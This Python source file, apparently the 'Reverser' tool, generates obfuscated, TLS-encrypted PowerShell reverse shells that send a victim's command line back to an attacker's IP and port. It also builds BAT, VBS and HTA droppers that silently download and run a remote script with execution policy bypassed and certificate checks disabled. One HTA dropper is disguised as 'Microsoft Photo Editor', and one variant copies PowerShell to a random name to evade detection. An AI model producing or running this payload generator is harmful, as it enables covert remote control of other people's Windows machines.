import os
import subprocess
import shutil
import random
import string
import base64
import argparse
from urllib.parse import urlparse
from colorama import Fore, Style, init

init()

def print_banner():
    banner = f"""{Fore.RED}
 ____
|  _ \ _____   _____ _ __ ___  ___ _ __
| |_) / _ \ \ / / _ \ '__/ __|/ _ \ '__|
|  _ <  __/\ V /  __/ |  \__ \  __/ |
|_| \_\___| \_/ \___|_|  |___/\___|_|

@ShkudW
{Style.RESET_ALL}"""
    print(banner)
    print(f"{Fore.CYAN}GitHub: https://github.com/ShkudW/Reverser{Style.RESET_ALL}")

def generate_certificate(cert_file, key_file):
    try:
        print(f"{Fore.YELLOW}Generating certificate...{Style.RESET_ALL}")
        process = subprocess.Popen([
            "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes",
            "-x509", "-subj", "/CN=www.reception.recep",
            "-keyout", key_file, "-out", cert_file
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for line in iter(process.stdout.readline, b''):
            colored_line = ''.join(random.choice([
                Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN
            ]) + chr(c) for c in line)
            print(colored_line, end='')

        process.stdout.close()
        process.wait()
        print(f"\n{Fore.GREEN}Certificate and key generated and saved to {cert_file} and {key_file}{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred during certificate creation: {e}")
        raise

def obfuscate_using_bank():
    bank = {
        "c1i3nt": random.choice([
            "$c1i3nt", "$CLiEn7", "$C1Li3n7", "$client", "$Cli3nt", "$cLiEnT",
            "$userCon", "$socketC", "$netCl", "$nc", "$tcpC", "$con"
        ]),
        "str3am": random.choice([
            "$str3am", "$StrE4m", "$sTR3Am", "$stream", "$stre4m", "$sTrEAm",
            "$dataStr", "$ds", "$netStr", "$dataStream", "$dStream", "$nStream"
        ]),
        "sslStr3am": random.choice([
            "$sslStr3am", "$SSlStr3Am", "$SsLStre4M", "$sslStream", "$sStr3am",
            "$sslStr", "$secStream", "$secStrm", "$sStrm", "$secureStream", "$sslStrm"
        ]),
        "r3ad3r": random.choice([
            "$r3ad3r", "$Re4d3R", "$rEAd3r", "$reader", "$re4d3r", "$rEaDeR",
            "$dataRdr", "$dr", "$txtReader", "$streamRdr", "$rdr", "$dReader"
        ]),
        "wr1t3r": random.choice([
            "$wr1t3r", "$WrIT3r", "$wRiT3r", "$writer", "$wriT3r", "$wRiTeR",
            "$dataWrt", "$dw", "$txtWriter", "$streamWrt", "$wrt", "$dWriter"
        ]),
        "cl4ss": random.choice([
            "$cl4ss", "$c1AsS", "$ClASs", "$cls", "$cl4Ss"
        ]),
        "lstn3r": random.choice([
            "$lstn3r", "$liSt3nEr", "$lIsTnr", "$listener", "$lst3nr", "$lstn"
        ]),
        "byt3s": random.choice([
            "$byt3s", "$bYt3S", "$bYTES", "$bytes", "$bytEs", "$bYtEs"
        ]),
        "s3ndbyts": random.choice([
            "$s3ndbyts", "$s3ndBytes", "$sndbYtEs", "$s3ndbytEs", "$sndBytes"
        ]),
        "3ncTxt": random.choice([
            "$3ncTxt", "$3nCdTxT", "$3nc0dEdTxt", "$EncodedText", "$encTxt"
        ]),
        "s3ndbck": random.choice([
            "$s3ndbck", "$s3ndBack", "$sBck", "$sendback"
        ])
    }
    return bank

def generate_encoded_obfuscated_ps1(ip, port):
    replacements = obfuscate_using_bank()

    ps1_function = f"""
function reverse {{
    [CmdletBinding(DefaultParameterSetName = "reverse")]
    param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName = "bind")]
        [String] $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "bind")]
        [Int] $Port,

        [Parameter(ParameterSetName = "reverse")] [Switch] $Reverse,
        [Parameter(ParameterSetName = "bind")] [Switch] $Bind
    )

    try {{
        Add-Type -TypeDefinition @"
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;

public class Tls12Stream : SslStream {{
    public Tls12Stream(NetworkStream stream) :
        base(stream, false, new RemoteCertificateValidationCallback((sender, cert, chain, errors) => true)) {{}}

    public void AuthenticateTls12(string targetHost) {{
        this.AuthenticateAsClient(targetHost, null, SslProtocols.Tls12, false);
    }}
}}
"@

        {replacements['c1i3nt']} = if ($Reverse) {{
            New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        }} elseif ($Bind) {{
            {replacements['lstn3r']} = [System.Net.Sockets.TcpListener]::new($Port)
            {replacements['lstn3r']}.Start()
            {replacements['lstn3r']}.AcceptTcpClient()
        }}

        {replacements['str3am']} = {replacements['c1i3nt']}.GetStream()
        {replacements['sslStr3am']} = [Tls12Stream]::new({replacements['str3am']})
        {replacements['sslStr3am']}.AuthenticateTls12($IPAddress)

        [byte[]]{replacements['byt3s']} = 0..65535 | ForEach-Object {{0}}
        $init = [System.Text.Encoding]::ASCII.GetBytes("Windows PowerShell running as $env:username on $env:computername`n`n")
        {replacements['sslStr3am']}.Write($init, 0, $init.Length)

        while (($i = {replacements['sslStr3am']}.Read({replacements['byt3s']}, 0, {replacements['byt3s']}.Length)) -ne 0) {{
            $cmd = ([System.Text.Encoding]::ASCII).GetString({replacements['byt3s']}, 0, $i).Trim()
            try {{
                $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
            }} catch {{
                $output = "Command failed: $_"
            }}
            $prompt = "PS " + (Get-Location).Path + "> "
            $resp = [System.Text.Encoding]::ASCII.GetBytes($output + $prompt)
            {replacements['sslStr3am']}.Write($resp, 0, $resp.Length)
            {replacements['sslStr3am']}.Flush()
        }}

        {replacements['c1i3nt']}.Close()
        if ({replacements['lstn3r']}) {{ {replacements['lstn3r']}.Stop() }}
    }} catch {{
        Write-Warning "Something went wrong!"
        Write-Error $_
    }}
}}

reverse -Reverse -IPAddress {ip} -Port {port}
"""

    encoded_command = base64.b64encode(ps1_function.encode('utf-8')).decode('utf-8')
    ps1_script = f"""
$e="{encoded_command}"
$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e))
IEX $u
"""
    return ps1_script


def save_encoded_ps1(ip, port, output_file):
    ps1_script = generate_encoded_obfuscated_ps1(ip, port)
    with open(output_file, 'w') as file:
        file.write(ps1_script.strip())
    print(f"{Fore.GREEN}Base64 encoded PowerShell script saved to {output_file}{Style.RESET_ALL}")

def generate_bat_with_encoded_ps1(server_url, output_file):
    bat_content = f"""
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }};
$wc = New-Object System.Net.WebClient;
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
$wc.Headers.Add('Referer','https://www.bing.com');
$wc.Headers.Add('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
$wc.Headers.Add('Cookie', 'sessionid=bM2Bhj6QixtA4n9GcFB4Ne5o4MiQEmHvKVFB6v0vHPoIIHAvIh');
$ps1 = $wc.DownloadString('{server_url}');
Invoke-Expression $ps1;
    """
    # Encode the PowerShell command to Base64
    encoded_command = base64.b64encode(bat_content.encode('utf-16le')).decode('utf-8')

    bat_script = f"""
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -encodedCommand {encoded_command}
    """

    with open(output_file, 'w') as file:
        file.write(bat_script.strip())

    print(f"{Fore.GREEN}Encoded batch script saved to {output_file}{Style.RESET_ALL}")

def generate_vbs_with_encoded_ps1(server_url, output_file):
    vbs_content = f"""
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' PowerShell command to run in hidden mode
command = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
          "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; " & _
          "$ps1 = (New-Object System.Net.WebClient).DownloadString('""" + server_url + """'); " & _
          "Invoke-Expression $ps1"

' Run the PowerShell command in hidden mode
objShell.Run command, 0, True
"""

    # Save the VBS file
    with open(output_file, 'w') as file:
        file.write(vbs_content.strip())

    print(f"{Fore.GREEN}Encoded VBS script saved to {output_file}{Style.RESET_ALL}")

def generate_vbs_with_encoded_ps1_lolbas(server_url, output_file, ps1_filename):
    random_name = ''.join(random.choices(string.ascii_lowercase, k=6)) + ".exe"
    destination = fr"C:\users\public\{random_name}"

    vbs_content = f"""
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")


If objFSO.FileExists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") Then
    objFSO.CopyFile "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "{destination}", True
End If


Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{destination} -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; $ps1 = (New-Object System.Net.WebClient).DownloadString('""" + server_url + """'); Invoke-Expression $ps1", 0, True
"""
    with open(output_file, 'w') as file:
        file.write(vbs_content.strip())

    print(f"{Fore.GREEN}Encoded VBS script with PowerShell copy saved to {output_file}{Style.RESET_ALL}")


def generate_hta_with_encoded_ps1(server_url, output_file):
    hta_content = f"""
<html>
<head>
    <title>Microsoft Photo Editor</title>
    <HTA:application
       id="htaExample"
        applicationname="Photo Editor"
        border="none"
        sysmenu="no"
        scroll="no"
        singleinstance="yes"
        />
</head>
<body>
<script language="VBScript">
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")

' PowerShell command to run in hidden mode
command = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
          "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}; " & _
          "$ps1 = (New-Object System.Net.WebClient).DownloadString('""" + server_url + """'); " & _
          "Invoke-Expression $ps1"

objShell.Run command, 0, True

</script>
<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
</body>
</html>
    """
    with open(output_file, 'w') as file:
        file.write(hta_content.strip())
    print(f"{Fore.GREEN}Encoded HTA script saved to {output_file}{Style.RESET_ALL}")




if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Generate a reverse shell with SSL encryption, LOLBAS, or regular PowerShell payload.")
    parser.add_argument("-ip", type=str, required=True, help="IP address for the reverse shell")
    parser.add_argument("-port", type=int, required=True, help="Port for the reverse shell")
    parser.add_argument("-type", type=str, choices=["ps1", "bat", "vbs", "hta"], required=True, help="Type of payload to generate (ps1/bat/vbs)")
    parser.add_argument("-server", type=str, help="Server URL to download PS1 script from (for BAT/VBS file)")
    parser.add_argument("-lolbas", action="store_true", help="Copy PowerShell and run from new location")

    args = parser.parse_args()

    # Validate lolbas usage
    if args.lolbas and args.type != "vbs":
        print(f"{Fore.RED}Error: The LOLBAS option can only be used with -type vbs.{Style.RESET_ALL}")
        exit(1)

    # Extract the PS1 filename from the server URL
    ps1_filename = os.path.basename(urlparse(args.server).path) if args.server else "payload.ps1"

    cert_file = "reception.pem"
    key_file = "reception.key"

    generate_certificate(cert_file, key_file)

    if args.lolbas:
        if args.type == "vbs":
            # Save the PS1 file first with the correct name
            save_encoded_ps1(args.ip, args.port, ps1_filename)
            output_file = "reception_lolbas.vbs"
            generate_vbs_with_encoded_ps1_lolbas(args.server, output_file, ps1_filename)
    else:
        if args.type in ["bat", "vbs", "hta"] and not args.server:
            print(f"{Fore.RED}Error: Server URL is required for BAT/VBS/HTA file generation.{Style.RESET_ALL}")
            exit(1)

        # Always save the PS1 file first with the correct name
        save_encoded_ps1(args.ip, args.port, ps1_filename)

        if args.type == "bat":
            output_file = "reception.bat"
            generate_bat_with_encoded_ps1(args.server, output_file)
        elif args.type == "vbs":
            output_file = "reception.vbs"
            generate_vbs_with_encoded_ps1(args.server, output_file)
        elif args.type == "hta":
            output_file = "reception.hta"
            generate_hta_with_encoded_ps1(args.server, output_file)

    print(f"{Fore.CYAN}To start an OpenSSL listener, run:\n{Fore.GREEN}openssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet{Style.RESET_ALL}")
